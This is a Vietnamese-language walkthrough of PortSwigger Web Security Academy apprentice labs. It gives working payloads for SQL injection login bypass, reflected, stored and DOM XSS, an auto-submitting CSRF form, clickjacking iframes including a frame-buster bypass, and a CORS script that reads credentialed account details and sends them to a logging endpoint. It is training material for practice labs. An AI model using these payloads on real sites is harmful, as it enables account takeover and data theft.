# Apprentice Level  
## SQL Injection  
### Lab 01: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data  
Chỉnh sửa tham số **category**: 
```
/filter?category=Lifestyle%27or%201=1--%20-
```  
    
![SQL Injection_1](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/SQL%20Injection_1.png)  
  
### Lab 02: SQL injection vulnerability allowing login bypass
Sử dụng Burp Suite bắt request login, chèn thêm **' or 1=1-- -**:
```
csrf=...&username=admin&password=abc'+or+1=1--+-
```  
  
![SQL Injection_2](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/SQL%20Injection_2.png)  
  
## Cros-site scripting
### Lab 01: Reflected XSS into HTML context with nothing encoded
Chèn **<script> alert(1) </script>** vào ô search của trang web:  
  
![Cross-site scripting_1](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_1.png)  
  
### Lab 02: Stored XSS into HTML context with nothing encoded
Chèn **<p> <script> alert(1) </script> <p>** vào ô comment của bài blog:  
  
![Cross-site scripting_2](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_2.png)  
  
### Lab 03: DOM XSS in *document.write* sink using source *location.search*
Sử dụng chức năng search với ký tự bất kỳ, ví dụ: **"a"**:  
  
![Cross-site scripting_3](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_3.png)  
  
Chèn **"> <script> alert(1) </script>**:
  
![Cross-site scripting_4](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_4.png)  
  
### Lab 04: DOM XSS in *innerHTML* sink using source *location.search*
Chèn **<img src=1 onerror=alert(1)>** vào ô search:  
  
![Cross-site scripting_5](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_5.png)  
  
### Lab 05: DOM XSS in jQuery anchor *href* attribute sink using *location.search* source
Thay đổi tham số **returnPath** thành ký tự bất kỳ trong URL: **/feedback?returnPath=/post**  
  
![Cross-site scripting_6](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_6.png)  
  
Thay tham số **returnPath** thành **javascript:alert(document.cookie)**, và bấm chọn **Back**:  
  
![Cross-site scripting_7](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_7.png)  
  
### Lab 06: DOM XSS in jQuery selector sink using a hashchange event
Code **auto-scroll**:  
  
![Cross-site scripting_8](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_8.png)  
  
Sử dụng **exploit server**, chèn trong phần **Body**:
```
<iframe src="https://0af700a404372efac08d0a6000db00ca.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```  
Chọn **Deliver exploit to victim**:  
  
![Cross-site scripting_9](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_9.png)  
  
### Lab 07: Reflected XSS into attribute with angle brackets HTML-encoded
Chèn **"onmouseover="alert(1)**:  
  
![Cross-site scripting_10](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_10.png)  
  
### Lab 08: Stored XSS into anchor *href* attribute with double quotes HTML-encoded
Thử điền các nội dung mục comment:  
  
![Cross-site scripting_11](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_11.png)  
  
Nội dung mục **Website** đã được đưa vào *href* attribute:  
  
![Cross-site scripting_12](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_12.png)  
  
Chèn **javascript:alert(1)** vào mục **Website**:  
  
![Cross-site scripting_13](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_13.png)  
  
### Lab 09: Reflected XSS into a JavaScript string with angle brackets HTML encoded
Code **search**:  
  
![Cross-site scripting_14](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_14.png)  
  
Chèn **'-alert(1)-'** vào ô **search**:  
  
![Cross-site scripting_15](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Cross-site%20scripting_15.png)  

## Cross-site request forgery (CSRF)
### Lab 01: CSRF vulnerability with no defenses
Sử dụng Burp Suite bắt gói tin khi thay đổi email:  
  
![CSRF_1](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/CSRF_1.png)  
  
Sử dụng **exploit server**, chèn trong phần **Body**:
```
<form method="POST" action="https://0afc00da04de96bbc05b0c5f00960024.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="ckiev5@test.com">
</form>
<script>
        document.forms[0].submit();
</script>
```  
![CSRF_2](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/CSRF_2.png) 
  
## Clickjacking
### Lab 01: Basic clickjacking with CSRF token protection
Sử dụng Burp Suite bắt request khi sử dụng chức năng **Update email** và **Delete Account**:  
  
![Clickjacking_2](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Clickjacking_1.png)   
  

![Clickjacking_2](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Clickjacking_2.png)  
  
CSRF token: **H5RP9ZPx7GbsenbxblkX6cXnOTnXs5je**  
Sử dụng **exploit server**, chèn trong phần **Body**:  
```
<style>
    iframe {
        position:relative;
        width: 500;
        height: 700 ;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450;
        left:60;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0ab4007904775bedc06216d2009e007d.web-security-academy.net/my-account"></iframe>
```  
### Lab 02: Clickjacking with form input data prefilled from a URL parameter
Sử dụng Burp Suite bắt request khi sử dụng chức năng **Update email**:  
  
![Clickjacking_3](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Clickjacking_3.png)  
  
Sử dụng **exploit server**, chèn trong phần **Body**:  
```
<style>
    iframe {
        position:relative;
        width: 500;
        height: 700 ;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450;
        left:60;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a32009e031d6c37c01f249800a30029.web-security-academy.net/my-account?email=ckiev5@test.com"></iframe>
```  
### Lab 03: Clickjacking with a frame buster script
Tương tự như Lab 02:  
```
<style>
    iframe {
        position:relative;
        width: 500;
        height: 700 ;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450;
        left:60;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="https://0a12002c03fdb39bc0d6f08500c8001a.web-security-academy.net/my-account?email=ckiev5@test.com"></iframe>
``` 
Lưu ý: Sử dụng **sandbox="allow-forms"** attribute để vô hiệu hóa frame buster script.  
## Cross-origin resource sharing (CORS)
### Lab 01: CORS vulnerability with basic origin reflection
Sử dụng **exploit server**, chèn trong phần **Body**:  
```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0ae0008b03e66af4c0c52a7100cd0018.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```  
  
![CORS_1](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/CORS_1.png)  

### Lab 02: CORS vulnerability with trusted null origin
  
  